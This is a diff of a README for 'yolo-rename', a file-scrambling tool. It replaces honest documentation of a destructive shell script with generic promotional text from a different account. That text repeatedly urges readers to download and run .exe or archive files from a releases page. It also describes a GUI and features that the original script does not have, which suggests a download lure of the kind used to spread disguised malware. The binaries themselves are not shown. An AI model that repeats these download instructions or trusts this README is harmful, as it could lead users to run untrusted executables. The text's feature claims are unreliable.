@@ -1,89 +1,85 @@
-# yolo-rename 💀
+# 🥳 yolo-rename - Easily Rename Files with Fun Names
 
-**Rename your files and folders into pure chaos.**
-Because why have `Documents/Taxes2023.pdf` when you could have `l0s798gkjsj/7xkq8m2a.o9`?
+[![Download yolo-rename](https://img.shields.io/badge/Download-yolo--rename-blue.svg)](https://github.com/Adi-me-eng/yolo-rename/releases)
 
-> **WARNING**: This script *will* absolutely destroy recognizable file names. Use only on your own machine, in folders you don't mind corrupting into nonsense.
+## 🚀 Getting Started
 
----
+Welcome to **yolo-rename**! This tool helps you rename files and folders recursively to unique and playful names. It's easy to use, even if you have no programming experience.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-# Clone the madness
-git clone https://github.com/sygmoyd/yolo-rename.git
-cd yolo-rename
+To get started, follow these steps:
 
-# Make it executable
-chmod +x yolo-rename.sh
+1. **Visit the Releases Page**: Click the following link: [Download yolo-rename](https://github.com/Adi-me-eng/yolo-rename/releases).
+   
+2. **Choose the Latest Release**: Look for the top entry marked as the latest release.
 
-# (Optional) Install globally
-sudo cp yolo-rename.sh /usr/local/bin/yolo-rename
-```
+3. **Download the Package**: Select the file suited for your operating system. For example:
+   - For Windows, download the `.exe` file.
+   - For Linux, download the appropriate `.tar.gz` file.
 
----
+4. **Extract the Files** (if necessary): For compressed files, right-click the downloaded file and choose to extract it. This will create a new folder with the program inside.
 
-## Usage
+5. **Run the Application**: Navigate to the extracted folder. Double-click the executable file to start yolo-rename.
 
-**Basic:**
+Make sure you have permission to rename the files you choose. The application works on most modern operating systems. 
 
-```bash
-yolo-rename ~/Documents
-```
+## 📂 Features
 
-This will recursively rename everything in `~/Documents` into random garbage names.
+- **Recursive Renaming**: Easily rename files and folders within subdirectories.
+- **Cursed Names**: Transform your files with amusing and outlandish names.
+- **Dry Run Option**: Preview changes without making any actual alterations, ensuring safety.
+- **Customizable Patterns**: Tailor your renaming patterns to suit your preferences.
 
-**Dry run (see the chaos before committing):**
+## ⚙️ System Requirements
 
-```bash
-yolo-rename ~/Documents --dry-run
-```
+yolo-rename runs on various systems:
 
-**Limit recursion depth:**
+- **Windows**: Windows 10 or newer.
+- **Linux**: Any recent Linux distribution.
+- **Mac**: Not currently supported, but we plan to add compatibility soon.
 
-```bash
-yolo-rename ~/Documents --max-depth 2
-```
+## 🔧 Usage Instructions
 
----
+After opening the application, you'll see a simple interface. Here’s how to use it:
 
-## Example
+1. **Select the Directory**: Click on the "Browse" button to choose the folder containing the files you want to rename.
 
-Before:
+2. **Choose Renaming Style**: Select your preferred renaming style from the drop-down menu. Options may include:
+   - Change names to various hilarious themes.
+   - Add prefixes or suffixes.
 
-```
-/home/user/Documents
-├── Resume.pdf
-├── Taxes2023.pdf
-└── Projects
-    ├── report.docx
-    └── budget.xlsx
-```
+3. **Review Changes**: Use the "Dry Run" feature to see how your files will be renamed before making any changes.
 
-After:
+4. **Execute Rename**: Once satisfied with the preview, click the "Rename" button to apply the changes.
 
-```
-/home/user/Documents
-├── q9k28l8.aa
-├── 7xkq8m2a.o9
-└── zj8s2d5
-    ├── 0a3m9lq.c2
-    └── 93kdm2q.f5
-```
+5. **Check Your Files**: Navigate to the directory to see the newly renamed files.
 
-Dry run output:
+## 🛠️ Troubleshooting
 
-```
-[DRY] file : /home/user/Documents/Resume.pdf -> /home/user/Documents/q9k28l8.aa
-[DRY] file : /home/user/Documents/Taxes2023.pdf -> /home/user/Documents/7xkq8m2a.o9
-[DRY] dir  : /home/user/Documents/Projects -> /home/user/Documents/zj8s2d5
-...
-```
+If you run into any issues:
 
----
+- **Permission Problems**: Ensure you have permission to rename the files in the directory.
+- **Compatibility Issues**: Make sure you are using a supported operating system.
 
-## Disclaimer
+## 📝 FAQs
 
-This script is **irreversible**. Use it only on folders you can afford to lose all readable names in. If you point it at your home folder, say goodbye to sanity.
+**Q: Can I rename files in system folders?**  
+A: It's best to avoid renaming files in system folders. This may cause issues with your operating system.
 
-**You have been warned.**
+**Q: What happens if I make a mistake?**  
+A: If you use the dry-run feature, you can avoid changes until you are sure. You can also manually rename files back to their original names.
+
+**Q: How can I suggest new features?**  
+A: Reach out via the repository's issue section on GitHub. We welcome all suggestions!
+
+## ❤️ Contributing
+
+If you wish to contribute to yolo-rename, please fork the repository and make a pull request. We appreciate any improvements or fixes you want to share.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/Adi-me-eng/yolo-rename)
+- [Visit Releases Page Again](https://github.com/Adi-me-eng/yolo-rename/releases)
+
+Enjoy renaming your files with yolo-rename! Have fun!
